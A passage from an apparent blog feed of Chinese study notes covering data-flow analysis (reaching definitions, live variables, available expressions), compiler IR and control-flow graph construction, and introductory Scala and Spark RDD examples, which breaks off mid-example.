定义的定值。</p><h3 id="到达定值中的数据流值"><a class="header-anchor" href="#到达定值中的数据流值">¶</a>到达定值中的数据流值</h3><ul><li><p>程序中所有变量的定值。</p></li><li><p>可以用一个 bit vector 来定义，有多少个赋值语句，就有多少个位。</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-636d998c52ac0af273e0132ee266eb2776960a6a%2Fimage-20210917164337106.png?alt=media" alt="image20210917164337106"></p></li></ul><h3 id="到达定值的转移方程"><a class="header-anchor" href="#到达定值的转移方程">¶</a>到达定值的转移方程</h3><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-3e295f6a541acdebfa6723be3fef4767d341be4a%2Fimage-20210917165027657.png?alt=media" alt="image20210917165027657"></p><ul><li><p>从入口状态删除 kill 掉的定值，并加入新生成的定值。</p></li><li><p>v = x op y，gen v, kill 其它所有的 v</p></li></ul><h3 id="到达定值的数据流处理"><a class="header-anchor" href="#到达定值的数据流处理">¶</a>到达定值的数据流处理</h3><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-bf27d0171f4c1a2154ef4ca5a32a314f3ef365bc%2Fimage-20210917165047931.png?alt=media" alt="image20210917165047931"></p><ul><li>任何一个前驱的变量定值都表明，该变量得到了定义。</li></ul><h3 id="到达定值的算法"><a class="header-anchor" href="#到达定值的算法">¶</a>到达定值的算法</h3><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-d75a2f21a7d73c7b77647552e1d4d8c2b05df0d8%2Fimage-20210917165459729.png?alt=media" alt="image20210917165459729"></p><p>这是一个经典的迭代算法。</p><ul><li><p>首先让所有BB和入口的OUT为空。因为你不知道 BB 中有哪些定值被生成。</p></li><li><p>当任意 OUT 发生变化，则分析出的定值可能需要继续往下流动，所需要修改各 BB 的 IN 和 OUT。</p></li><li><p>先处理 IN，然后再根据转移完成更新 OUT。</p></li><li><p>在 gen U (IN - kill) 中，kill 与 gen 相关的 bit 不会因为 IN 的改变而发生改变，而其它 bit 又是通过对前驱 OUT 取并得到的，因此其它 bit 不会发生 0 -&gt; 1 的情况。所以，OUT 是不断增长的，而且有上界，因此算法最后必然会停止。</p></li><li><p>因为 OUT 没有变化，不会导致任何的 IN 发生变化，因此 OUT 不变可以作为终止条件。我们称之为程序到达了不动点（Fixed Point）</p></li></ul><h1>Live Variables Analysis 活跃变量分析</h1><h3 id="基本概念-v2"><a class="header-anchor" href="#基本概念-v2">¶</a>基本概念</h3><ul><li><p>变量 x 在程序点 p 上的值是否会在某条从 p 出发的路径中使用</p></li><li><p>变量 x 在 p 上活跃，当 且仅存在一条从 p 开始的路径，该路径的末端使用了 x，且路径上没有对 x进行覆盖。</p></li><li><p>隐藏了这样一个含义：在被使用前，v 没有被重新定义过，即没有被 kill 过。</p></li></ul><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-8028408e55824acb82318de3596fed265fae7c92%2Fimage-20210917171457003.png?alt=media" alt="image20210917171457003"></p><p>这个算法可以用于寄存器分配，当一个变量不会再被使用，那么此变量就可以从寄存器中腾空，用于新值的存储。</p><h3 id="活跃变量中的数据流值"><a class="header-anchor" href="#活跃变量中的数据流值">¶</a>活跃变量中的数据流值</h3><ul><li><p>程序中的所有变量</p></li><li><p>依然可以用 bit vector 来表示，每个 bit 代表一个变量</p></li></ul><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-c32987d8974af375601fbedbadf9a35d64c40355%2Fimage-20210917171825938.png?alt=media" alt="image20210917171825938"></p><h3 id="活跃变量的转移方程和控制流处理"><a class="header-anchor" href="#活跃变量的转移方程和控制流处理">¶</a>活跃变量的转移方程和控制流处理</h3><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-dbcba96308e24d66f22932ced97046ce3e2a3da3%2Fimage-20210917184215918.png?alt=media" alt="image20210917184215918"></p><ul><li><p>一个基本块内，若 v = exp, 则 def v。若 exp = exp op v，那么 use v。一个变量要么是 use，要么是 def，根据 def 和 use 的先后顺序来决定。</p></li><li><p>考虑基本块 B 及其后继 S。若 S 中，变量 v 被使用，那么我们就把 v 放到 S 的 IN 中，交给 B 来分析。</p></li><li><p>因此对于活跃变量分析，其控制流处理是 OUT[B] = IN[S]。</p></li><li><p>在一个块中，若变量 v 被使用，那么我们需要添加到我们的 IN 里。而如果 v 被定义，那么在其之上的语句中，v 都是一个非活跃变量，因为没有语句再需要使用它。</p></li><li><p>因此对于转移方程，IN 是从 OUT 中删去重新定值的变量，然后并上使用过的变量。需要注意，如果同一个块中，变量 v 的 def 先于 use ，那么实际上效果和没有 use 是一样的。</p></li></ul><h3 id="活跃变量的算法"><a class="header-anchor" href="#活跃变量的算法">¶</a>活跃变量的算法</h3><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-4d4897f46f36ce3ecdbdaa59735ddec022fb04a0%2Fimage-20210917185149738.png?alt=media" alt="image20210917185149738"></p><ul><li><p>我们不知道块中有哪些活跃变量，而且我们的目标是知道在一个块开始时哪些变量活跃，因此把 IN 初始化为空。</p></li><li><p>初始化的判断技巧：may analysis 是空，must analysis 是 top。</p></li></ul><h1>Available Expression Analysis 可用表达式分析</h1><p>基本概念</p><ul><li>x + y 在 p 点可用的条件：从流图入口结点到达 p 的每条路径都对 x + y 求了值，且在最后一次求值之后再没有对 x 或 y 赋值</li></ul><p>可用表达式可以用于全局公共子表达式的计算。也就是说，如果一个表达式上次计算的值到这次仍然可用，我们就能直接利用其中值，而不用进行再次的计算。</p><p>可用表达式分析中的数据流值</p><ul><li><p>程序中的所有表达式</p></li><li><p>bit vector 中，一个 bit 就是一个表达式</p></li></ul><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-e74207dd3eb120f43b9c7d62ac9d79ecedc5c711%2Fimage-20210917193557643.png?alt=media" alt="image20210917193557643"></p><p>可用表达式的转移方程和控制流处理</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-924d909bf930d008c395ca66c917a4456c1f3fb2%2Fimage-20210917200639739.png?alt=media" alt="image20210917200639739"></p><p>​</p><ul><li><p>我们要求无论从哪条路径到达 B，表达式都应该已经计算，才能将其视为可用表达式，因此这是一个 must analysis。</p></li><li><p>注意到图中，两条不同的路径可能会导致表达式的结果最终不一致。但是我们只关心它的值能不能够再被重复利用，因此可以认为表达式可用。</p></li><li><p>v = x op y，则 gen x op y。当 x = a op b，则任何包含 x 的表达式都被 kill 掉。若 gen 和 kill 同时存在，那么以最后一个操作为准。</p></li><li><p>转移方程很好理解，和到达定值差不多。但是，由于我们是 must analysis，因此控制流处理是取交集，而非到达定值那样取并集。</p></li></ul><p>可用表达式的算法</p><p>​</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-24e381cf0c32e0bf6899805c5af235154203bd01%2Fimage-20210917201617719.png?alt=media" alt="image20210917201617719"></p><p>​</p><ul><li><p>注意此时的初始化：一开始确实无任何表达式可用，因此OUT[entry]被初始化为空集是自然的。但是，其它基本块的 OUT 被初始化为全集，这是因为当 CFG 存在环时，一个空的初始化值，会让取交集阶段直接把第一次迭代的 IN 设置成 0，无法进行正确的判定了。</p></li><li><p>如果一个表达式从来都不可用，那么OUT[entry]的全 0 值会通过交操作将其置为 0，因此不用担心初始化为全 1 会否导致算法不正确。</p></li></ul><p>总结</p><p>​</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-f7d238c672f33055777343e79965af4258c83e86%2Fimage-20210917202539780.png?alt=media" alt="image20210917202539780"></p><p>​</p><p>划重点</p><ul><li><p>三种数据流分析</p><ul><li>到达定值</li></ul></li><li><p>活跃变量</p></li><li><p>可用表达式</p></li><li><p>三种数据流分析的区别和联系</p></li><li><p>知道迭代算法，以及算法能停机的原因</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPA-02</title>
      <link href="/2022/09/26/SPA-02/"/>
      <url>/2022/09/26/SPA-02/</url>
      
        <content type="html"><![CDATA[<h1>中间表示（IR）</h1><h2 id="1-Compilers-and-Static-Analyzers"><a class="header-anchor" href="#1-Compilers-and-Static-Analyzers">¶</a>1.Compilers and Static Analyzers</h2><p>编译器将源代码（Source code） 转换为机器代码（Machine Code）。其中的流程框架是：</p><ul><li><p>词法分析器（Scanner），结合正则表达式，通过词法分析（Lexical Analysis）将 source code 翻译为 token。</p></li><li><p>语法分析器（Parser），结合上下文无关文法（Context-Free Grammar），通过语法分析（Syntax Analysis），将 token 解析为抽象语法树（Abstract Syntax Tree, AST）</p></li><li><p>语义分析器（Type Checker），结合属性文法（Attribute Grammar），通过语义分析（Semantic Analysis），将 AST 解析为 decorated AST</p></li><li><p>Translator，将 decorated AST 翻译为生成三地址码这样的中间表示形式（Intermediate Representation, IR），并<strong>基于 IR 做静态分析</strong>（例如代码优化这样的工作）。</p></li><li><p>Code Generator，将 IR 转换为机器代码。</p></li></ul><p>有人要问了，为什么不直接拿 source code 做静态分析？这是因为我们得先确保这是一份合格的代码，然后再进行分析。分析代码合不合格，这是 trivial 的事情，由前面的各种分析器去做就行了，我们要做的是 non-trivial 的事情。</p><h3 id="AST-vs-IR"><a class="header-anchor" href="#AST-vs-IR">¶</a>AST vs. IR</h3><p>为什么在静态分析的时候，使用 IR 而非 AST 呢？</p><p>​</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-1bca5284b5ed4e7ddb3f63673cdfeea2f8b64ff5%2Fimage-20210909175715157.png?alt=media" alt="image-20210909175715157"></p><p>​</p><p>这是因为：</p><ul><li><p>AST 是 high-level 且接近语法结构的，而 IR 是 low-level 且接近机器代码的。</p></li><li><p>AST 是依赖于语言的，IR 通常是独立于语言的：三地址码会被分析器重点关注，因为可以将各种前端语言统一翻译成同一种 IR 再加以优化。</p></li><li><p>AST 适合快速类型检查，IR 的结构更加紧凑和统一：在 AST 中包含了很多非终结符所占用的结点（body, assign 等），而 IR 中不会需要到这些信息。</p></li><li><p>AST 缺少控制流信息，IR 包含了控制流信息：AST 中只是有结点表明了这是一个 do-while 结构，但是无法看出控制流信息；而 IR 中的 goto 等信息可以轻易看出控制流。</p></li><li><p>因此 IR 更适合作为静态分析的基础。</p></li></ul><h1></h1><h3 id="IR-Three-Address-Code"><a class="header-anchor" href="#IR-Three-Address-Code">¶</a>IR: Three-Address Code</h3><p>三地址码（3-Address Code）通常没有统一的格式。在每个指令的右边至多有一个操作符。</p><p>​</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-7cdb324efda1515269d09643503971fa38b8101e%2Fimage-20210909180558685.png?alt=media" alt="image-20210909180558685"></p><p>​</p><p>三地址码为什么叫做三地址码呢？因为每条 3AC 至多有三个“地址”。而一个“地址”可以是：</p><ul><li><p>名称 Name: a, b</p></li><li><p>常量 Constant: 3</p></li><li><p>编译器生成的临时变量 Compiler-generated Temporary: t1, t2</p></li></ul><p>常见的 3AC 包括：</p><ul><li><p>x = y bop z：双目运算并赋值，bop = binary operator</p></li><li><p>x = uop z：单目运算并赋值，uop = unary operator</p></li><li><p>x = y：直接赋值</p></li><li><p>goto L：无条件跳转，L = label</p></li><li><p>if x goto L：条件跳转</p></li><li><p>if x rop y goto L：包含了关系运算的条件跳转，rop = relational operator</p></li></ul><h3 id="3AC-in-Real-Static-Analyzer-Soot"><a class="header-anchor" href="#3AC-in-Real-Static-Analyzer-Soot">¶</a>3AC in Real Static Analyzer: Soot</h3><p>Soot 是 Java 的静态分析框架，其中的 IR 叫做 Jimple。可使用进行观察。</p><h2 id="2-Basic-Blocks-Control-Flow-Graphs"><a class="header-anchor" href="#2-Basic-Blocks-Control-Flow-Graphs">¶</a>2.Basic Blocks &amp; Control Flow Graphs</h2><p>控制流分析（Control Flow Analysis）通常指的是构建控制流图（Control Flow Graph, CFG），并以 CFG 作为基础结构进行静态分析的过程。</p><p>​<img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-54245164dfcbb10013b4dcf0245b82da179dcb1b%2Fimage-20210909194221057.png?alt=media" alt>​</p><p>CFG 的一个结点可以是一条单独的 3AC，但是更常见的是一个基本块（Basic Block）。所谓基本块，就是满足以下性质的连续 3AC：</p><ul><li><p>只能从块的第一条指令进入。</p></li><li><p>只能从块的最后一条指令离开。</p></li></ul><p>​<img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-ff324fb2d3988f335fd42f30dceff16c9c98a9f3%2Fimage-20210909193825373.png?alt=media" alt="image-20210909193825373">​</p><p>如何构建一个基本块呢？</p><ul><li><p>输入：程序 P 的一系列 3AC</p></li><li><p>输出：程序 P 的基本块</p></li><li><p>方法</p><ul><li><p>1.决定 P 的 leaders</p><ul><li><p>P 的第一条指令就是一个 leader</p></li><li><p>跳转的目标指令是一个 leader</p></li><li><p>跳转指令的后一条指令，也是一个 leader</p></li></ul></li><li><p>2.构建 P 的基本块</p><ul><li>一个基本块就是一个 leader 及其后续直到下一个 leader 前的所有指令。</li></ul></li></ul></li></ul><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-54245164dfcbb10013b4dcf0245b82da179dcb1b%2Fimage-20210909194221057.png?alt=media" alt="image-20210909194221057"></p><p>除了基本块，CFG 中还会有块到块的边。块 A 和块 B 之间有一条边，当且仅当：</p><ul><li><p>A 的末尾有一条指向了 B 开头的跳转指令。</p></li><li><p>A 的末尾紧接着 B 的开头，且 A 的末尾不是一条无条件跳转指令。</p></li></ul><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-4d43ad5536ef3b00e5c5cd80595dae602f64394c%2Fimage-20210909194550772.png?alt=media" alt="image-20210909194550772"></p><p>注意到每个基本块和开头指令的标号唯一对应，因此很自然地，我们可以将跳转指令的目标改为基本块的标号而非指令标号：</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-5e3b46796c3711c5dacea1805b4a9c99dd3c5431%2Fimage-20210909194912657.png?alt=media" alt="image-20210909194912657"></p><p>有了这些定义，我们就可以了解一些概念：</p><ul><li><p>若 A -&gt; B，则我们说 A 是 B 的前驱（predecessor），B 是 A 的后继（successor）</p></li><li><p>除了构建好的基本块，我们还会额外添加两个结点，「入口（Entry）」和「出口（Exit）」，这两个结点不对应任何 IR</p></li><li><p>入口有一条边指向 IR 中的第一条指令</p></li><li><p>如果一个基本块的最后一条指令会让程序离开这段 IR，那么这个基本块就会有一条边指向出口。</p></li></ul><p>这样，我们就完成了一个控制流图的构建：</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-abdd1a531e6995abe2059e9e1e5a9d9103259de6%2Fimage-20210909195613197.png?alt=media" alt="image-20210909195613197"></p><p>划重点</p><ul><li><p>编译器与静态分析器的关系</p></li><li><p>了解 3AC 和其通常形式</p></li><li><p>如何基于 IR 构建基本块</p></li><li><p>如何基于基本块构建控制流图</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BigData1-Scala</title>
      <link href="/2022/09/25/BigData1-Scala/"/>
      <url>/2022/09/25/BigData1-Scala/</url>
      
        <content type="html"><![CDATA[<h2 id="1-和Java-进行交互"><a class="header-anchor" href="#1-和Java-进行交互">¶</a>1.和Java 进行交互</h2><p>在 Scala 程序中，java.lang包下的类是默认全部引入的，其它包下的类则需要显式(explicitly)引入，且Scala 可以和 Java 进行无缝(seemlessly)的交互操作。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.&#123;<span class="type">Date</span>, <span class="type">Locale</span>&#125;</span><br><span class="line"><span class="keyword">import</span> java.text.<span class="type">DateFormat</span></span><br><span class="line"><span class="keyword">import</span> java.text.<span class="type">DateFormat</span>._ <span class="comment">//scala中*是合法标识符，_代表所有</span></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">FrenchDate</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]) &#123;</span><br><span class="line">    <span class="keyword">val</span> now = <span class="keyword">new</span> <span class="type">Date</span></span><br><span class="line">    <span class="keyword">val</span> df = getDateInstance(<span class="type">LONG</span>, <span class="type">Locale</span>.<span class="type">FRANCE</span>) println(df format now)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>df format now是一个语法特性，如果一个方法只接受一个参数，那么可以使用 infix 语法，和 df.format(now)的语义完全相同</p><h2 id="2-函数是对象"><a class="header-anchor" href="#2-函数是对象">¶</a>2.函数是对象</h2><p>Scala 中，函数(functions)也是对象(objects)，所以，函数可以当做参数进行传递，可以把函数存储在变量中，也可以把函数作为其他函数的返回值。这种将函数当做值进行操作的能力，是函数式编程（functional programming）最重要的特性之一。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Timer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">oncePerSecond</span></span>(callback: () =&gt; <span class="type">Unit</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123; callback(); <span class="type">Thread</span> sleep <span class="number">1000</span> &#125; &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">timeFlies</span></span>() &#123;println(<span class="string">&quot;time flies like an arrow...&quot;</span>)&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]) &#123;oncePerSecond(timeFlies)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的程序实现了简单定时器的功能，负责定时的函数（function）名为：oncePerSecond，它接受一个回调函数作为参数，该回调函数的类型记为：() =&gt; Unit，代表任何无参数、无返回值的函数（Unit和 C/C++中的 void类似）。程序的 main 方法调用定时函数，作为实参传进去的回调函数 timeFlies，仅仅向终端打印一句话，所以，该程序的实际功能是：每秒钟在屏幕上打印一条信息：time ﬂies like an arrow。</p><h3 id="匿名函数"><a class="header-anchor" href="#匿名函数">¶</a>匿名函数</h3><p>这里的timeFlies函数只被用过一次，也就是当做回调函数传给 oncePerSecond的时候，对于这种函数，在用到的时候即时构造更合理，因为可以省去定义和命名的麻烦，在 Scala 中，这样的函数称为匿名函数（anonymous functions），也就是没有名字的函数。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]) &#123;</span><br><span class="line">    oncePerSecond(() =&gt;</span><br><span class="line">        println(<span class="string">&quot;time flies like an arrow...&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中的右箭头‘=&gt;’表明程序中存在一个匿名函数，箭头左边是匿名函数的参数列表，右边是函数体。在本例中，参数列表为空(箭头左边是一对空括号)，而函数体和改造前定义的 timeFlies 函数保持一致。</p><h2 id="3-类"><a class="header-anchor" href="#3-类">¶</a>3.类</h2><p>与java不同的是，Scala中的类定义可以带参数。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span>(<span class="params">real: <span class="type">Double</span>, imaginary: <span class="type">Double</span></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">re</span></span>() = real  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">im</span></span>() = imaginary</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="无参方法"><a class="header-anchor" href="#无参方法">¶</a>无参方法</h3><p>无参方法像访问类属性（fields）一样访问类的方法，使程序更加简洁；和零参方法的差异在于：无参方法在声明和调用时，均无须在方法名后面加括号。<code>def re = real</code></p><h3 id="继承和方法重写"><a class="header-anchor" href="#继承和方法重写">¶</a>继承和方法重写</h3><p>Scala 中重写（overriding）从父类继承的方法，必须使用 override修饰符来显式声明</p><p><code>override def toString() = &quot;&quot; +re + (if (im &lt; 0) &quot;&quot; else &quot;+&quot;) + im + &quot;i&quot;</code></p><h2 id="4-条件类和模式匹配"><a class="header-anchor" href="#4-条件类和模式匹配">¶</a>4.条件类和模式匹配</h2><h3 id="条件类的引入"><a class="header-anchor" href="#条件类的引入">¶</a>条件类的引入</h3><p>在 Java 中，建立树形结构最常见的做法是：创建一个表示树的抽象类，然后每<br>种类型的节点用一个继承自抽象类的子类来表示。而在函数式编程语言中，则可以使用<br>代数数据类型（algebraic data-type）来达到同样的目的。Scala 则提供了一种介于两者之间（类继承和代数数据类型），被称为条件类（case classes）的概念，下面就是用条件类定义树的示例代码：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Tree</span></span></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Sum</span>(<span class="params">l: <span class="type">Tree</span>, r: <span class="type">Tree</span></span>) <span class="keyword">extends</span> <span class="title">Tree</span>  <span class="title">case</span> <span class="title">class</span> <span class="title">Var</span>(<span class="params">n: <span class="type">String</span></span>) <span class="keyword">extends</span> <span class="title">Tree</span></span></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Const</span>(<span class="params">v: <span class="type">Int</span></span>) <span class="keyword">extends</span> <span class="title">Tree</span></span></span><br></pre></td></tr></table></figure><p>上例中的Sum, Var和Const就是条件类，它们与普通类的差异主要体现在如下几个方面：</p><ul><li><p>新建条件类的实例，无须使用new关键字</p></li><li><p>自动为构造函数所带的参数创建对应的 getter 方法（也就是说，如果 c是 Const的实例，通过 c.v即可访问构造函数中的同名参数v的值）</p></li><li><p>条件类都默认实现equals 、hashCode和toString方法，与java的同名默认实现基本相同</p></li><li><p>条件类的实例可以通过模式匹配进行分解</p></li></ul><h3 id="例子：算术式求值"><a class="header-anchor" href="#例子：算术式求值">¶</a>例子：算术式求值</h3><p>既然我们已经定义了用于表示算术表达式的数据结构，接下来我们可以定义作用在这<br>些数据结构上的操作。首先，我们定义一个在特定环境（environment，上下文）中对表达式进行求值的函数，其中环境的作用是为了确定表达式中的变量的取值。例如：<br>有一个环境，对变量 x 的赋值为 5，我们记为：{x → 5}，那么，在这个环境上求 x + 1的值，得到的结果为 6。</p><p>在程序中，环境也需要一种合理的方式来表示。可以使用哈希表（hash table）之类的数据结构，也可以直接使用函数（functions）！实际上，环境就是一个给变量赋予特定值的函数。上面提到的环境：{x → 5}，在 Scala 中可以写成：<code>&#123; case &quot;x&quot; =&gt; 5 &#125;</code></p><p>上面这一行代码定义了一个函数，如果给该函数传入一个字符串&quot;x&quot;作为参数，则函数返回整数 5，否则，将抛出异常。同理，定义一个将字符串转为整数的环境可以简化代码，<code>type Environment = String =&gt; Int</code></p><p>求值函数：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eval</span></span>(t: <span class="type">Tree</span>, env: <span class="type">Environment</span>): <span class="type">Int</span> = t <span class="keyword">match</span> &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="type">Sum</span>(l, r) =&gt; eval(l, env) + eval(r, env) <span class="keyword">case</span> <span class="type">Var</span>(n) =&gt; env(n)  </span><br><span class="line"><span class="keyword">case</span> <span class="type">Const</span>(v) =&gt; v</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模式匹配的过程，实际上就是把一个值和一系列的模式进行比对，如果能够匹配上，则从值中取出有用的部分进行命名，然后用这些命名的部分（作为参数）来驱动另一段代码的执行。</p><p>“模式匹配”和“类方法”除了编程风格的差异，也各有利弊，决策者需要根据程序的扩展性需求做出权衡和选择：</p><ul><li><p>使用类方法，添加一种节点类型比较简单，新增一种操作比较麻烦，因为要修改所有子类</p></li><li><p>使用模式匹配，新增节点类型需要修改所有操作函数，而增加新的操作则只需要增加新的函数</p></li></ul><h2 id="5-Traits（特性）-和Genericity（泛型）"><a class="header-anchor" href="#5-Traits（特性）-和Genericity（泛型）">¶</a>5.Traits（特性） 和Genericity（泛型）</h2><p>traits可以理解为java中的接口；Genericity即模板。</p><p><code>class Ref[T] &#123;var contents: T = _&#125;</code></p><p>这里赋给变量的初始值_代表各种类型的默认值。</p><h2 id="6-RDD"><a class="header-anchor" href="#6-RDD">¶</a>6.RDD</h2><p>RDD（Resilient Distributed Dataset弹性分布式数据集）是Spark中抽象的数据结构类型，任何数据在Spark中都被表示为RDD。从编程的角度来看，RDD可以简单看成是一个数组。和普通数组的区别是，RDD中的数据时分区存储的，这样不同分区的数据就可以分布在不同的机器上，同时可以被并行处理。因此，Spark应用程序所做的无非是把需要处理的数据转换为RDD，然后对RDD进行一系列的变换和操作，从而得到结果。</p><h3 id="1-创建"><a class="header-anchor" href="#1-创建">¶</a>1.创建</h3><p>RDD可以从普通数组创建出来，也可以从文件系统或者HDFS中的文件创建出来。</p><ol><li>从普通数组创建RDD，里面包含了1到9这9个数字，它们分别在3个分区中</li></ol><p><code>scala&gt; val a = sc.parallelize(1 to 9, 3)</code></p><ol start="2"><li>读取文件README.md来创建RDD，文件中的每一行就是RDD中的一个元素</li></ol><p><code>scala&gt; val b = sc.textFile(&quot;README.md&quot;)</code></p><h3 id="2-两类操作算子"><a class="header-anchor" href="#2-两类操作算子">¶</a>2.两类操作算子</h3><p>主要分两类，转换（transformation）和动作（action）。两类函数的主要区别是，transformation接受RDD并返回RDD，而action接受RDD返回非RDD.</p><p>transformation操作是延迟计算的，也就是说从一个RDD生成另一个RDD的转换操作不是马上执行，需要等到有action操作的时候才真正触发运算。</p><h3 id="3-部分转换算子"><a class="header-anchor" href="#3-部分转换算子">¶</a>3.部分转换算子</h3><h4 id="map"><a class="header-anchor" href="#map">¶</a>map</h4><p>对RDD中的每个元素都执行一个<strong>指定的函数</strong>来产生一个<strong>新的</strong>RDD。任何原RDD中的元素在新RDD中都有且只有一个元素与之对应。</p><p>举例：</p><p>scala&gt; val a = sc.parallelize(1 to 9, 3)</p><p>scala&gt; val b = a.map(x =&gt; x*2)</p><p>scala&gt; a.collect</p><p>res10: Array[Int] = Array(1, 2, 3, 4, 5, 6, 7, 8, 9)</p><p>scala&gt; b.collect</p><p>res11: Array[Int] = Array(2, 4, 6, 8, 10, 12, 14, 16, 18)</p><h4 id="flatMap"><a class="header-anchor" href="#flatMap">¶</a>flatMap</h4><p>与map类似，区别是原RDD中的元素经map处理后只能生成一个元素，而原RDD中的元素经flatmap处理后可生成多个元素来构建新RDD。</p><p>举例：对原RDD中的每个元素x产生y个元素（从1到y，y为元素x的值）</p><p>scala&gt; val a = 